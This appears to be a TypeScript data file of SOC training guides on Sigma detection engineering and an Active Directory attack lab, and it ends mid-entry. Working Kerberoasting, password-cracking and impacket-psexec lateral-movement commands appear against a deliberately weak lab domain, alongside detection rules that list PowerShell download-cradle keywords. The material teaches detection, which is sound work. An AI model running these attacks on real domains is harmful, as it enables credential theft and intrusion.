/**
 * SOC-prep L2 guides, projects 05–08. These assume the lab from project 01 and
 * the detection basics from project 02.
 */
import type { ProjectGuide } from "@/lib/guides/types";

/* -------------------------------------------------------------------------- */
/* 05 — Detection engineering with Sigma                                       */
/* -------------------------------------------------------------------------- */

export const g05: ProjectGuide = {
  slug: "sigma-detection-engineering",
  projectId: 5,
  intro:
    "<p>In project 02 you wrote a detection in Splunk's query language. That rule only works in Splunk. Move to a company running Elastic or Sentinel and you would have to rewrite it from scratch.</p><p><b>Sigma</b> solves that. You write the detection logic once in a plain YAML file, then convert it to whatever query language you need. It is often described as &ldquo;Snort for log files&rdquo; — a vendor-neutral way to share detections.</p><p>You are going to write real Sigma rules, convert them to SPL, test them against actual attacks in your lab, and — the part that separates detection engineering from rule-writing — measure how many false positives each one produces before you would ever deploy it.</p>",
  glossary: [
    {
      term: "YAML",
      plain:
        "A text format that uses indentation instead of brackets. Sigma rules are YAML files. Indentation is meaningful — two spaces, never tabs, or the file will not parse.",
    },
    {
      term: "Detection logic",
      plain:
        "The <code>detection:</code> block of a Sigma rule: one or more named selections of field values, plus a <code>condition:</code> that combines them.",
    },
    {
      term: "Backend",
      plain:
        "The converter target. <code>splunk</code>, <code>elasticsearch</code>, <code>microsoft365defender</code> — each turns the same rule into that platform's query syntax.",
    },
    {
      term: "Pipeline",
      plain:
        "A mapping from Sigma's generic field names to your log source's actual field names. Sigma says <code>Image</code>; your Splunk index might call it <code>process_path</code>. The pipeline bridges that.",
    },
    {
      term: "MITRE ATT&CK",
      plain:
        "A catalogue of attacker techniques with IDs like <code>T1059.001</code> (PowerShell). Tagging rules with these lets you see which techniques you can and cannot detect.",
    },
  ],
  before: [
    "<b>Projects 01 and 02 finished.</b> You need the lab and a working understanding of what a detection is.",
    "Python 3.8 or newer on the machine where you will run the converter. Check with <code>python3 --version</code>.",
    "About 5 hours.",
  ],
  steps: [
    {
      title: "Install Sigma and the Splunk backend",
      time: "20 min",
      body: "<p><code>sigma-cli</code> is the modern converter. Install it in a virtual environment so it does not interfere with anything else on the machine.</p>",
      commands: [
        {
          lang: "bash",
          label: "Install",
          code: "python3 -m venv ~/sigma-env\nsource ~/sigma-env/bin/activate     # Windows: ~\\sigma-env\\Scripts\\activate\n\npip install sigma-cli\nsigma plugin install splunk",
        },
        {
          lang: "bash",
          label: "Confirm it works",
          code: "sigma version\nsigma list targets",
        },
      ],
      expect:
        "<p>A version number, and <code>splunk</code> listed among the available targets.</p>",
      expectCode:
        "sigma-cli 1.0.4\n\n+-------------+------------------------------------+\n| Identifier  | Target query language              |\n+-------------+------------------------------------+\n| splunk      | Splunk search language             |\n+-------------+------------------------------------+",
      fixes: [
        {
          problem: "\"externally-managed-environment\" error from pip",
          cause:
            "Newer Debian and Ubuntu refuse to let pip install into the system Python.",
          fix: "That is exactly what the virtual environment above prevents. Make sure you ran the <code>source</code> line — your prompt should start with <code>(sigma-env)</code>.",
        },
        {
          problem: "'sigma' is not recognised after installing",
          cause: "The venv is not active in this shell.",
          fix: "Run the <code>source ~/sigma-env/bin/activate</code> line again. You need it in every new terminal.",
        },
      ],
    },
    {
      title: "Read an existing rule before writing one",
      time: "25 min",
      why: "Sigma's public rule repository has thousands of production-quality examples. Reading three good ones teaches the format faster than any tutorial.",
      body: "<p>Clone the official repository and look at how experienced authors structure a rule.</p>",
      commands: [
        {
          lang: "bash",
          code: "git clone --depth 1 https://github.com/SigmaHQ/sigma.git ~/sigma-rules\ncd ~/sigma-rules\n\n# How many rules are there?\nfind rules -name '*.yml' | wc -l\n\n# Read one that relates to what you built in project 02\ncat rules/windows/builtin/security/win_security_susp_failed_logon_source.yml",
        },
      ],
      expect:
        "<p>Several thousand rules. In the one you opened, notice the parts every rule has: <code>title</code>, <code>id</code> (a UUID), <code>status</code>, <code>logsource</code>, <code>detection</code>, <code>falsepositives</code>, and <code>level</code>.</p><p>Pay particular attention to <code>falsepositives</code>. Every serious rule documents what will trip it accidentally. A rule without that section has not been thought through.</p>",
      expectCode: "3184",
    },
    {
      title: "Write your first rule",
      time: "40 min",
      why: "Start with something you already know is detectable — the brute force from project 02 — so that when it does not work, you know the rule is wrong rather than the data.",
      body: "<p>Create a working directory and write the rule. Indentation is two spaces and matters absolutely.</p>",
      commands: [
        {
          lang: "yaml",
          label: "~/my-sigma/brute_force_smb.yml",
          code: "title: Multiple Failed Logons From Single Source\nid: 8f3a1b22-4d5e-4a1f-9c2b-1e7d6a4f0c33\nstatus: experimental\ndescription: >\n  Detects more than ten failed logon attempts from one source address\n  within a short window, which indicates password guessing.\nreferences:\n  - https://attack.mitre.org/techniques/T1110/\nauthor: Your Name\ndate: 2026/07/26\ntags:\n  - attack.credential_access\n  - attack.t1110.001\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4625\n    LogonType:\n      - 3\n      - 10\n  filter_machine_accounts:\n    TargetUserName|endswith: '$'\n  condition: selection and not filter_machine_accounts\nfalsepositives:\n  - Users who genuinely forgot their password\n  - Service accounts with a stale credential in a scheduled task\n  - Vulnerability scanners performing authenticated scans\nlevel: medium",
        },
        {
          lang: "bash",
          label: "Check it parses before going further",
          code: "mkdir -p ~/my-sigma && cd ~/my-sigma\n# (save the YAML above as brute_force_smb.yml)\n\nsigma check brute_force_smb.yml",
        },
      ],
      expect:
        "<p><code>sigma check</code> reports no errors. Note the <code>filter_machine_accounts</code> selection — computer accounts in Active Directory end with <code>$</code> and fail logons constantly for boring reasons. Excluding them is the difference between a rule people use and one they mute.</p>",
      expectCode: "Checking 1 rules\n\nNo errors found.",
      fixes: [
        {
          problem: "\"could not determine a constructor for the tag\"",
          cause: "A tab character somewhere in the YAML.",
          fix: "YAML forbids tabs for indentation. In most editors, enable &ldquo;show whitespace&rdquo; and replace them with two spaces. In vim: <code>:set expandtab | retab</code>.",
        },
        {
          problem: "\"Rule identifier must be a UUID\"",
          cause: "The <code>id</code> field needs a real UUID.",
          fix: "Generate one with <code>python3 -c \"import uuid; print(uuid.uuid4())\"</code> and paste it in.",
        },
      ],
    },
    {
      title: "Convert it to Splunk and run it",
      time: "30 min",
      why: "This is the payoff — one rule, any platform. Seeing the generated SPL also teaches you what the abstraction is actually doing.",
      body: "<p>Convert, then paste the result into Splunk.</p>",
      commands: [
        {
          lang: "bash",
          label: "Convert",
          code: "sigma convert -t splunk brute_force_smb.yml",
        },
        {
          lang: "bash",
          label: "Convert everything you write, into a file",
          code: "sigma convert -t splunk ~/my-sigma/ > ~/my-sigma/converted-splunk.txt\ncat ~/my-sigma/converted-splunk.txt",
        },
      ],
      expect:
        "<p>Generated SPL. Notice it does <b>not</b> include the threshold — Sigma describes what an event looks like, not how many of them constitute an attack. You add the aggregation yourself, which is why the rule below is only half the detection.</p>",
      expectCode:
        "EventID=4625 LogonType IN (3, 10) NOT TargetUserName=\"*$\"",
      fixes: [
        {
          problem: "The generated query returns nothing in Splunk",
          cause:
            "Field-name mismatch. Sigma uses <code>EventID</code> and <code>TargetUserName</code>; your Splunk index may use <code>EventCode</code> and <code>Account_Name</code>.",
          fix: "This is what pipelines are for — see the next step. As a quick check, run <code>index=main EventCode=4625 | fieldsummary | table field</code> to see what your fields are actually called.",
        },
      ],
    },
    {
      title: "Fix the field names with a pipeline",
      time: "30 min",
      why: "This is the step everyone hits and most tutorials skip. Sigma's field names are generic; yours are whatever your ingestion produced. The pipeline is the translation layer, and understanding it is what makes Sigma usable in a real environment.",
      body: "<p>Write a small pipeline that maps Sigma's names onto your index's names.</p>",
      commands: [
        {
          lang: "yaml",
          label: "~/my-sigma/splunk-lab-pipeline.yml",
          code: "name: Lab Splunk field mapping\npriority: 100\ntransformations:\n  - id: field_mapping\n    type: field_name_mapping\n    mapping:\n      EventID: EventCode\n      TargetUserName: Account_Name\n      IpAddress: Source_Network_Address\n      LogonType: Logon_Type\n    rule_conditions:\n      - type: logsource\n        product: windows\n\n  - id: set_index\n    type: add_condition\n    conditions:\n      index: main\n    rule_conditions:\n      - type: logsource\n        product: windows",
        },
        {
          lang: "bash",
          label: "Convert using the pipeline",
          code: "sigma convert -t splunk -p splunk-lab-pipeline.yml brute_force_smb.yml",
        },
      ],
      expect:
        "<p>SPL that uses <i>your</i> field names and is scoped to your index. Paste it into Splunk with the time range covering your project 02 attack — it should return those 4625 events.</p>",
      expectCode:
        "index=\"main\" EventCode=4625 Logon_Type IN (3, 10) NOT Account_Name=\"*$\"",
      fixes: [
        {
          problem: "\"Pipeline file could not be parsed\"",
          cause: "Indentation again, or a missing <code>priority</code> field.",
          fix: "Validate the YAML on its own first: <code>python3 -c \"import yaml,sys; yaml.safe_load(open('splunk-lab-pipeline.yml'))\"</code>. Silence means it is valid.",
        },
      ],
    },
    {
      title: "Add the threshold and turn it into a real alert",
      time: "30 min",
      why: "A Sigma rule matches single events. An alert needs \"how many, over what period\" — and choosing those numbers is the actual engineering.",
      body: "<p>Take the converted query and wrap it in the aggregation you learned in project 02.</p>",
      commands: [
        {
          lang: "spl",
          label: "The complete detection",
          code: "index=\"main\" EventCode=4625 Logon_Type IN (3, 10) NOT Account_Name=\"*$\"\n| bucket _time span=5m\n| stats count as failures,\n        dc(Account_Name) as accounts_targeted,\n        values(Account_Name) as targets\n        by _time, Source_Network_Address\n| where failures >= 10\n| eval severity = case(\n    accounts_targeted > 5, \"high — password spray across accounts\",\n    failures > 50,         \"high — sustained brute force\",\n    1==1,                  \"medium\")",
        },
      ],
      expect:
        "<p>Your project 02 attack, classified. The <code>eval severity</code> line is worth internalising: many accounts with few attempts each is a <b>password spray</b> and behaves completely differently from one account hammered a hundred times. The same raw events, two different incidents.</p>",
      expectCode:
        "_time                Source_Network_Address  failures  accounts_targeted  severity\n2026-07-26 14:35:00  192.168.56.10           20        1                  medium",
    },
    {
      title: "Measure the false positive rate before deploying",
      time: "40 min",
      why: "This is the difference between someone who writes rules and someone who is trusted to deploy them. An untested rule that fires 200 times a day gets muted within a week, and then it is worse than nothing — because everyone believes it is protecting them.",
      body: "<p>Run the detection over a long window of <b>normal</b> data and count how often it would have fired when nothing was wrong.</p>",
      commands: [
        {
          lang: "spl",
          label: "Backtest over 30 days",
          code: "index=\"main\" EventCode=4625 Logon_Type IN (3, 10) NOT Account_Name=\"*$\"\nearliest=-30d latest=now\n| bucket _time span=5m\n| stats count as failures by _time, Source_Network_Address\n| where failures >= 10\n| stats count as total_alerts,\n        dc(Source_Network_Address) as distinct_sources\n| eval alerts_per_day = round(total_alerts / 30, 2)",
        },
        {
          lang: "spl",
          label: "Which sources would be responsible?",
          code: "index=\"main\" EventCode=4625 earliest=-30d\n| stats count by Source_Network_Address, Account_Name\n| where count >= 10\n| sort - count",
        },
      ],
      expect:
        "<p>In a quiet lab this is close to zero, which is the answer you want but not a very instructive one. The second search is the useful one — in a real environment it names the specific service accounts and scanners you would need to exclude, and the exclusion list <i>is</i> the tuning.</p>",
      expectCode:
        "total_alerts  distinct_sources  alerts_per_day\n2             1                 0.07\n\n→ under one alert per week. Deployable.",
      fixes: [
        {
          problem: "The backtest returns no data at all",
          cause: "Your lab is only a few days old, so a 30-day window is mostly empty.",
          fix: "Use <code>earliest=-7d</code> and divide by 7 instead. Note the limitation in your write-up — being explicit about what your evidence does not cover is a strength.",
        },
      ],
    },
    {
      title: "Write a second rule for something harder",
      time: "45 min",
      why: "Brute force is easy — it is loud and repetitive. Real detection engineering is about behaviour that looks almost normal.",
      body: "<p>Write a rule for suspicious PowerShell: encoded commands and download cradles. This is <code>T1059.001</code> and it appears in a very large share of real intrusions.</p>",
      commands: [
        {
          lang: "yaml",
          label: "~/my-sigma/suspicious_powershell.yml",
          code: "title: Suspicious PowerShell Encoded Command Or Download Cradle\nid: 2c9d4e11-7b3a-4f8e-a1d5-6b2c8e0f4a71\nstatus: experimental\ndescription: >\n  Detects PowerShell launched with an encoded command, or invoking a\n  download cradle. Both are heavily used to run code without writing\n  a file to disk.\nreferences:\n  - https://attack.mitre.org/techniques/T1059/001/\nauthor: Your Name\ndate: 2026/07/26\ntags:\n  - attack.execution\n  - attack.t1059.001\n  - attack.defense_evasion\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection_encoded:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains:\n      - ' -enc '\n      - ' -EncodedCommand '\n      - ' -e '\n  selection_cradle:\n    CommandLine|contains:\n      - 'DownloadString'\n      - 'DownloadFile'\n      - 'Invoke-WebRequest'\n      - 'IEX('\n      - 'Invoke-Expression'\n  filter_known_good:\n    ParentImage|endswith:\n      - '\\SCCM\\CcmExec.exe'\n  condition: (selection_encoded or selection_cradle) and not filter_known_good\nfalsepositives:\n  - Software deployment tools that legitimately use encoded commands\n  - Administrator scripts that fetch files over HTTP\nlevel: high",
        },
        {
          lang: "powershell",
          where: "On soc-victim",
          label: "Generate the event so you can test the rule",
          code: "# Harmless — this just base64-encodes and runs \"Write-Host hello\".\n# It produces exactly the command line the rule looks for.\n$cmd = 'Write-Host \"hello from encoded powershell\"'\n$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))\npowershell.exe -enc $enc",
        },
      ],
      expect:
        "<p>Convert the rule and run it in Splunk — you should find the process you just launched. If you get nothing, you almost certainly do not have process creation logging enabled, which the fix below covers.</p>",
      fixes: [
        {
          problem: "No process creation events exist in Splunk at all",
          cause:
            "Windows does not log process creation with command lines by default. This is the most common gap in a home lab.",
          fix: "On the Windows VM, open <code>gpedit.msc</code> → <b>Computer Configuration → Administrative Templates → System → Audit Process Creation</b> → enable <b>Include command line in process creation events</b>. Then in <code>secpol.msc</code> → <b>Advanced Audit Policy → Detailed Tracking → Audit Process Creation</b> → Success. Run <code>gpupdate /force</code>. Event 4688 will now include command lines.",
        },
        {
          problem: "Events appear but CommandLine is empty",
          cause: "The audit policy is on but the command-line inclusion setting is not.",
          fix: "It is the separate Administrative Templates setting in the fix above — both are required.",
        },
      ],
    },
    {
      title: "Map your coverage to MITRE ATT&CK",
      time: "30 min",
      why: "Two rules is not a detection programme. Knowing which techniques you cover and which you do not — and being able to show it — is what a detection engineer is actually paid for.",
      body: "<p>Extract the ATT&amp;CK tags from your rules and build a simple coverage list.</p>",
      commands: [
        {
          lang: "bash",
          label: "What do your rules cover?",
          code: "grep -h -A5 '^tags:' ~/my-sigma/*.yml \\\n  | grep -oE 'attack\\.t[0-9]+(\\.[0-9]+)?' \\\n  | sort -u",
        },
        {
          lang: "bash",
          label: "What could they cover? Compare against the public repo.",
          code: "grep -rhoE 'attack\\.t[0-9]+(\\.[0-9]+)?' ~/sigma-rules/rules/windows/ \\\n  | sort | uniq -c | sort -rn | head -20",
        },
      ],
      expect:
        "<p>Your two or three techniques, against the twenty most commonly covered ones. The gap is your roadmap — and being able to say &ldquo;I have coverage for T1110 and T1059.001, and here are the next three I would build and why&rdquo; is a genuinely strong interview answer.</p>",
      expectCode: "attack.t1059.001\nattack.t1110.001",
    },
    {
      title: "Publish the rules",
      time: "25 min",
      why: "Rules in a folder on your laptop prove nothing. Rules in a repository with a README are portfolio evidence.",
      body: "<p>Create a git repository containing your rules, your pipeline, and a README that explains: what each rule detects, the false positives you found, the thresholds and why you chose them, and the ATT&amp;CK coverage.</p><p>If a rule is genuinely good and not already covered, consider contributing it upstream to SigmaHQ. A merged pull request to a well-known security project is worth a great deal on a CV.</p>",
      expect:
        "<p>A public repository someone could clone and use. The README is the part that matters — it is what demonstrates you understand the engineering rather than just the syntax.</p>",
    },
  ],
  after: [
    "Re-run the backtest monthly. Environments drift, and a rule that was quiet in July can be noisy in October.",
    "Learn one more backend — convert your rules to <code>elasticsearch</code> or <code>microsoft365defender</code> and confirm they still make sense. That is the whole point of Sigma.",
    "Read the SigmaHQ contribution guidelines. Even if you never submit, they are an excellent short course in what makes a rule good.",
  ],
};

/* -------------------------------------------------------------------------- */
/* 06 — AD attack lab: Kerberoasting and lateral movement                      */
/* -------------------------------------------------------------------------- */

export const g06: ProjectGuide = {
  slug: "ad-attack-lab",
  projectId: 6,
  intro:
    "<p>Active Directory runs identity for the overwhelming majority of companies, which makes it the thing attackers go after once they have any foothold at all. If you can explain how an attacker moves through AD and how each step looks in logs, you are ahead of most L1 candidates.</p><p>You are going to build a small domain, run two classic attacks against it — <b>Kerberoasting</b> and <b>lateral movement</b> — and then find both in your own logs. Doing the attack first is deliberate: you cannot write a detection for something you have never seen.</p>",
  glossary: [
    {
      term: "Domain Controller (DC)",
      plain:
        "The server that holds the Active Directory database and answers authentication requests. Compromise it and you own everything.",
    },
    {
      term: "Kerberos",
      plain:
        "The authentication protocol AD uses. Instead of sending passwords around, it issues time-limited tickets. Understanding tickets is most of understanding AD attacks.",
    },
    {
      term: "SPN",
      plain:
        "Service Principal Name — a label that ties a service (like a SQL server) to the account running it. Any domain user can request a ticket for any SPN, which is the flaw Kerberoasting exploits.",
    },
    {
      term: "Kerberoasting",
      plain:
        "Requesting a service ticket, which is encrypted with the service account's password hash, then cracking it offline. No alerts fire during the cracking because it happens entirely on the attacker's machine.",
    },
    {
      term: "Lateral movement",
      plain:
        "Using access on one machine to reach another. In AD this is usually stolen credentials plus a remote execution tool like PsExec or WinRM.",
    },
    {
      term: "Pass-the-hash",
      plain:
        "Authenticating with a password's hash instead of the password itself. Works because NTLM never checks that you know the plaintext.",
    },
  ],
  before: [
    "<b>Project 01 finished</b>, plus enough RAM for a third VM — realistically 16 GB total.",
    "A Windows Server evaluation ISO from the <a href=\"https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022\" target=\"_blank\" rel=\"noopener noreferrer\">Microsoft Evaluation Center</a> (free, 180 days).",
    "Snapshots of your existing VMs, because this project changes their network configuration.",
    "About 8 hours. Split it across two sessions — build the domain, then attack it.",
  ],
  steps: [
    {
      title: "Build the domain controller",
      time: "60 min",
      warn: "Everything here happens on the isolated host-only network. Never connect a deliberately weak domain to a real network.",
      body: "<p>Create a third VM named <code>soc-dc</code>: Windows Server 2022, 4096 MB RAM, 50 GB disk, host-only network only. Install Windows Server with the <b>Desktop Experience</b> option — the GUI makes this far easier the first time.</p><p>Give it a fixed address of <code>192.168.56.30</code>, and set its own DNS server to <code>127.0.0.1</code> (a DC is its own DNS).</p><p>Then promote it to a domain controller:</p>",
      commands: [
        {
          lang: "powershell",
          where: "On soc-dc, as Administrator",
          label: "Install the AD role and create the forest",
          code: "Install-WindowsFeature AD-Domain-Services -IncludeManagementTools\n\nInstall-ADDSForest `\n  -DomainName \"soclab.local\" `\n  -DomainNetbiosName \"SOCLAB\" `\n  -InstallDns `\n  -SafeModeAdministratorPassword (ConvertTo-SecureString \"LabRecovery123!\" -AsPlainText -Force) `\n  -Force",
        },
      ],
      expect:
        "<p>The server reboots automatically. When it comes back, the login screen shows <code>SOCLAB\\Administrator</code> rather than a local account. Confirm:</p>",
      expectCode:
        "PS C:\\> Get-ADDomain | Select-Object Name, DNSRoot, DomainMode\n\nName    DNSRoot       DomainMode\n----    -------       ----------\nsoclab  soclab.local  Windows2016Domain",
      fixes: [
        {
          problem: "\"The password does not meet the length, complexity...\"",
          cause: "The safe-mode password must satisfy the default complexity policy.",
          fix: "Use at least 8 characters with upper, lower, digit, and symbol. <code>LabRecovery123!</code> qualifies.",
        },
        {
          problem: "Install-ADDSForest warns about DNS delegation",
          cause: "Normal for an isolated lab with no parent DNS zone.",
          fix: "Ignore it. The warning is expected and the promotion continues.",
        },
      ],
    },
    {
      title: "Create users and a deliberately weak service account",
      time: "30 min",
      why: "Kerberoasting only works against accounts with an SPN. You need one, and it needs a crackable password — otherwise the attack technically succeeds but you never see the payoff.",
      body: "<p>Create a few normal users and one service account. The weak password is intentional: it makes the crack finish in seconds rather than days, which is the point of the exercise.</p>",
      commands: [
        {
          lang: "powershell",
          where: "On soc-dc",
          label: "Normal users",
          code: "$pw = ConvertTo-SecureString \"UserPass123!\" -AsPlainText -Force\n\nforeach ($u in @(\"alice\",\"bob\",\"carol\")) {\n  New-ADUser -Name $u -SamAccountName $u `\n    -UserPrincipalName \"$u@soclab.local\" `\n    -AccountPassword $pw -Enabled $true\n}",
        },
        {
          lang: "powershell",
          where: "On soc-dc",
          label: "The Kerberoastable service account",
          code: "# Weak password on purpose so the crack is fast.\n$svcpw = ConvertTo-SecureString \"Summer2024\" -AsPlainText -Force\n\nNew-ADUser -Name \"svc_sql\" -SamAccountName \"svc_sql\" `\n  -UserPrincipalName \"svc_sql@soclab.local\" `\n  -AccountPassword $svcpw -Enabled $true `\n  -PasswordNeverExpires $true\n\n# The SPN is what makes it roastable\nsetspn -A MSSQLSvc/sqlserver.soclab.local:1433 svc_sql\n\n# Give it privileges, so cracking it is actually worth something\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members svc_sql",
        },
      ],
      expect: "<p>The SPN is registered and visible to any domain user:</p>",
      expectCode:
        "PS C:\\> setspn -Q MSSQLSvc/sqlserver.soclab.local:1433\nChecking domain DC=soclab,DC=local\nCN=svc_sql,CN=Users,DC=soclab,DC=local\n        MSSQLSvc/sqlserver.soclab.local:1433",
      fixes: [
        {
          problem: "\"Duplicate SPN found\"",
          cause: "You ran setspn twice.",
          fix: "Harmless. Remove and re-add if you want it clean: <code>setspn -D MSSQLSvc/sqlserver.soclab.local:1433 svc_sql</code>.",
        },
      ],
    },
    {
      title: "Join the victim machine to the domain",
      time: "20 min",
      body: "<p>On <code>soc-victim</code>, point DNS at the domain controller first — domain join fails without it, and this is the single most common stumbling block.</p>",
      commands: [
        {
          lang: "powershell",
          where: "On soc-victim, as Administrator",
          label: "DNS first, then join",
          code: "# Point at the DC for DNS\n$if = (Get-NetAdapter | Where-Object Status -eq 'Up')[0].ifIndex\nSet-DnsClientServerAddress -InterfaceIndex $if -ServerAddresses 192.168.56.30\n\n# Confirm name resolution works before attempting the join\nResolve-DnsName soclab.local\n\n# Join and reboot\nAdd-Computer -DomainName soclab.local `\n  -Credential (Get-Credential SOCLAB\\Administrator) -Restart",
        },
      ],
      expect:
        "<p>After the reboot you can log in as <code>SOCLAB\\alice</code>. Confirm with <code>whoami</code> — it should print <code>soclab\\alice</code>, not <code>soc-victim\\alice</code>.</p>",
      fixes: [
        {
          problem: "\"An Active Directory Domain Controller could not be contacted\"",
          cause: "DNS. The machine is asking the wrong server where the domain lives.",
          fix: "Verify with <code>Resolve-DnsName soclab.local</code> — it must return <code>192.168.56.30</code>. If it does not, re-run the <code>Set-DnsClientServerAddress</code> line and check you targeted the right adapter.",
        },
        {
          problem: "\"The specified domain either does not exist or could not be contacted\"",
          cause: "Firewall on the DC, or the two VMs are on different virtual networks.",
          fix: "From the victim: <code>Test-NetConnection 192.168.56.30 -Port 389</code>. If that fails, the problem is network-level, not domain-level.",
        },
      ],
    },
    {
      title: "Ship the DC's logs to Splunk",
      time: "20 min",
      why: "The DC is where the interesting events are. Kerberos ticket requests are logged there and nowhere else.",
      body: "<p>Install the Universal Forwarder on the DC exactly as you did for the victim in project 01, and add the Security log. Then turn on the audit policy that records Kerberos service ticket requests, which is off by default.</p>",
      commands: [
        {
          lang: "powershell",
          where: "On soc-dc, as Administrator",
          label: "Enable Kerberos service ticket auditing",
          code: "auditpol /set /subcategory:\"Kerberos Service Ticket Operations\" /success:enable /failure:enable\nauditpol /set /subcategory:\"Kerberos Authentication Service\" /success:enable /failure:enable\n\n# Confirm\nauditpol /get /subcategory:\"Kerberos Service Ticket Operations\"",
        },
        {
          lang: "powershell",
          where: "On soc-dc",
          label: "Forward the Security log",
          code: "cd \"C:\\Program Files\\SplunkUniversalForwarder\\bin\"\n.\\splunk.exe add forward-server 192.168.56.10:9997 -auth admin:YOUR_PASSWORD\n.\\splunk.exe add monitor \"WinEventLog://Security\" -index main -auth admin:YOUR_PASSWORD\n.\\splunk.exe restart",
        },
      ],
      expect:
        "<p>In Splunk, <code>index=main host=soc-dc</code> returns events. Look for <b>4768</b> (Kerberos authentication ticket requested) and <b>4769</b> (service ticket requested) — those are the two you will hunt with.</p>",
      expectCode: "auditpol /get output:\n\nKerberos Service Ticket Operations    Success and Failure",
    },
    {
      title: "Run the Kerberoasting attack",
      time: "45 min",
      warn: "Only against your own lab domain.",
      why: "Seeing how little the attack requires is the lesson. Any domain user — no admin rights at all — can do this.",
      body: "<p>Log into <code>soc-victim</code> as <code>SOCLAB\\alice</code>, an ordinary user with no special privileges. Request the service ticket using nothing but built-in Windows functionality.</p>",
      commands: [
        {
          lang: "powershell",
          where: "On soc-victim, as SOCLAB\\alice",
          label: "Request the ticket — no tools, no admin rights",
          code: "Add-Type -AssemblyName System.IdentityModel\n\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `\n  -ArgumentList \"MSSQLSvc/sqlserver.soclab.local:1433\"\n\n# The ticket is now cached in memory. Confirm:\nklist",
        },
        {
          lang: "bash",
          where: "On soc-splunk",
          label: "The realistic version, using impacket",
          code: "sudo apt install -y python3-impacket   # or: pip install impacket\n\nimpacket-GetUserSPNs soclab.local/alice:'UserPass123!' \\\n  -dc-ip 192.168.56.30 -request -outputfile roasted.txt\n\nhead -c 200 roasted.txt",
        },
      ],
      expect:
        "<p><code>klist</code> lists a ticket for <code>MSSQLSvc/sqlserver.soclab.local</code>. The impacket version writes a crackable hash to a file. Note what did <b>not</b> happen: no failed logon, no alert, no privilege check. This is why Kerberoasting is so popular — it looks almost exactly like normal Kerberos usage.</p>",
      expectCode:
        "$krb5tgs$23$*svc_sql$SOCLAB.LOCAL$MSSQLSvc/sqlserver.soclab.local:1433*$\na1f4c2...  (long hex blob)",
      fixes: [
        {
          problem: "impacket-GetUserSPNs: \"KRB_AP_ERR_SKEW: Clock skew too great\"",
          cause:
            "Kerberos requires clocks within five minutes of each other, and VMs drift badly after being suspended.",
          fix: "Sync the attacking machine to the DC: <code>sudo ntpdate 192.168.56.30</code>, or <code>sudo timedatectl set-ntp false && sudo date -s \"$(date)\"</code> after checking the DC's time.",
        },
        {
          problem: "\"No entries found\" from GetUserSPNs",
          cause: "The SPN was not registered, or you are querying the wrong domain.",
          fix: "On the DC run <code>setspn -T soclab.local -Q */*</code> to list every SPN in the domain.",
        },
      ],
    },
    {
      title: "Crack the ticket offline",
      time: "20 min",
      why: "The offline part is what makes this dangerous. Once the attacker has the ticket, cracking generates zero network traffic and zero logs — you cannot detect it, only the request that preceded it.",
      body: "<p>Crack the hash with a small wordlist. The password you chose is weak deliberately, so this finishes in seconds.</p>",
      commands: [
        {
          lang: "bash",
          where: "On soc-splunk",
          code: "sudo apt install -y john\n\n# A tiny wordlist containing the answer\nprintf 'Password1\\nSummer2024\\nWinter2023\\nCompany123\\n' > wordlist.txt\n\njohn --wordlist=wordlist.txt roasted.txt\njohn --show roasted.txt",
        },
      ],
      expect:
        "<p>The password appears in plaintext. That account is in Domain Admins — so this ordinary user just became a domain administrator, and the only thing that touched the network was one perfectly normal-looking ticket request.</p>",
      expectCode: "Summer2024       (?)\n1 password hash cracked, 0 left",
      fixes: [
        {
          problem: "\"No password hashes loaded\"",
          cause: "The output file is empty or wrongly formatted.",
          fix: "Check it with <code>cat roasted.txt</code> — you need a line starting <code>$krb5tgs$</code>. If empty, the <code>-request</code> flag was missing from GetUserSPNs.",
        },
      ],
    },
    {
      title: "Now detect it",
      time: "45 min",
      why: "This is the point of the whole project. You know exactly what you did and when, so you can measure honestly whether your detection would have caught it.",
      body: "<p>Kerberoasting shows up as event <b>4769</b>. The signal is not the event itself — those happen constantly — but three things about it: weak encryption, an unusual service name, and one user requesting many different tickets.</p>",
      commands: [
        {
          lang: "spl",
          label: "Detection 1 — weak RC4 encryption",
          code: "index=main host=soc-dc EventCode=4769\n| eval enc = case(\n    Ticket_Encryption_Type==\"0x17\", \"RC4-HMAC (weak — crackable)\",\n    Ticket_Encryption_Type==\"0x12\", \"AES256 (strong)\",\n    1==1, Ticket_Encryption_Type)\n| search enc=\"RC4*\"\n| table _time, Account_Name, Service_Name, Client_Address, enc",
        },
        {
          lang: "spl",
          label: "Detection 2 — one user, many services (the stronger signal)",
          code: "index=main host=soc-dc EventCode=4769\n| bucket _time span=10m\n| stats dc(Service_Name) as services_requested,\n        values(Service_Name) as which\n        by _time, Account_Name\n| where services_requested > 5",
        },
      ],
      expect:
        "<p>Detection 1 finds your attack — RC4 tickets are the ones worth cracking, so attackers request them specifically. Note the trade-off: in a domain with older systems, legitimate RC4 traffic exists and this rule gets noisy. Detection 2 is quieter but only catches attackers who enumerate broadly.</p><p>Neither is perfect. Saying that out loud, with your own measurements behind it, is what a strong candidate does.</p>",
      expectCode:
        "_time                Account_Name  Service_Name  Client_Address  enc\n2026-07-26 15:12:44  alice         svc_sql       192.168.56.20   RC4-HMAC (weak — crackable)",
      fixes: [
        {
          problem: "No 4769 events at all",
          cause: "The Kerberos audit subcategory is not enabled, or the DC is not forwarding.",
          fix: "Re-check step 4. Confirm on the DC with <code>auditpol /get /subcategory:\"Kerberos Service Ticket Operations\"</code> and confirm forwarding with <code>index=main host=soc-dc | head 5</code>.",
        },
        {
          problem: "Ticket_Encryption_Type field does not exist",
          cause: "Field extraction differs without the Splunk Windows add-on.",
          fix: "Search the raw text instead: <code>index=main EventCode=4769 \"0x17\"</code>, then extract properly once the add-on is installed.",
        },
      ],
    },
    {
      title: "Move laterally, and catch that too",
      time: "45 min",
      why: "Cracking a credential is only useful if you can use it somewhere. Lateral movement is the step that turns one compromised machine into a compromised network.",
      body: "<p>Use the cracked service account to execute commands on another machine, then find the trace it leaves.</p>",
      commands: [
        {
          lang: "bash",
          where: "On soc-splunk",
          label: "Remote execution with the cracked credential",
          code: "impacket-psexec soclab.local/svc_sql:'Summer2024'@192.168.56.20\n\n# You get a SYSTEM shell. Run something identifiable:\n# C:\\> whoami\n# C:\\> hostname",
        },
        {
          lang: "spl",
